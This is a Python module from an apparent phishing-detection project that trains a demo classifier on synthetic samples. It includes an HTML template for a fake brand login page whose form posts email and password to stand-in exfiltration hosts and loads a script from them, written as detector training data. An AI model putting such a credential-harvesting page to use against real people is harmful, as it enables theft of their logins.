"""Trains the classifier backing the demo API.

This is NOT the Phase 3/4 experiment's classifier — that requires
downloaded PhishTank/OpenPhish/Tranco snapshots the demo doesn't ship
with. This is a small, self-contained model trained entirely from in-repo
synthetic legacy patterns plus the mocked LLM-generated partition
(`phishshield.data.generation`), good enough to back a live demo but not a
scientific result — the report's numbers come from `train_baseline`/
`run_mitigation` against real data, not from this module.
"""

from __future__ import annotations

from functools import lru_cache

from sklearn.ensemble import HistGradientBoostingClassifier

from phishshield.data.generation import generate_llm_phishing_dataset
from phishshield.data.pipeline import build_feature_dataframe
from phishshield.data.schema import Sample, Source
from phishshield.models.classifier import train_classifier

_SYNTHETIC_PHISHING_HTML = """<!DOCTYPE html>
<html>
<head>
  <title>{brand} - Verify Your Account</title>
  <script src="https://{exfil_host}/track.js"></script>
</head>
<body>
  <div style="display:none">hidden tracking pixel</div>
  <form action="https://{exfil_host}/collect" method="POST">
    <input type="email" name="email" />
    <input type="password" name="password" />
  </form>
</body>
</html>
"""

_SYNTHETIC_BENIGN_HTML = """<!DOCTYPE html>
<html>
<head><title>{name}</title></head>
<body><h1>{name}</h1><p>Nothing to see here.</p></body>
</html>
"""

_EXFIL_HOSTS = ["collect.exfil-drop.ru", "beacon.credential-sink.top", "relay.harvest-node.cn"]
_BRANDS = ["SecureBank", "MegaMail", "CloudPay", "SwiftShip", "PrimeStream", "VaultBank"]


def _synthetic_legacy_pool(n_each: int = 30) -> list[Sample]:
    phishing = [
        Sample(
            url=f"https://{_BRANDS[i % len(_BRANDS)].lower()}-secure-{i}.verify-login.xyz/signin",
            label=1,
            source=Source.PHISHTANK,
            html=_SYNTHETIC_PHISHING_HTML.format(
                brand=_BRANDS[i % len(_BRANDS)],
                exfil_host=_EXFIL_HOSTS[i % len(_EXFIL_HOSTS)],
            ),
        )
        for i in range(n_each)
    ]
    benign = [
        Sample(
            url=f"https://site-{i}.example.com/",
            label=0,
            source=Source.TRANCO,
            html=_SYNTHETIC_BENIGN_HTML.format(name=f"Site {i}"),
        )
        for i in range(n_each)
    ]
    return phishing + benign


@lru_cache(maxsize=1)
def get_demo_model() -> HistGradientBoostingClassifier:
    """Return the demo classifier, training it once per process."""
    train_samples = _synthetic_legacy_pool() + generate_llm_phishing_dataset()
    train_df = build_feature_dataframe(train_samples)
    return train_classifier(train_df)
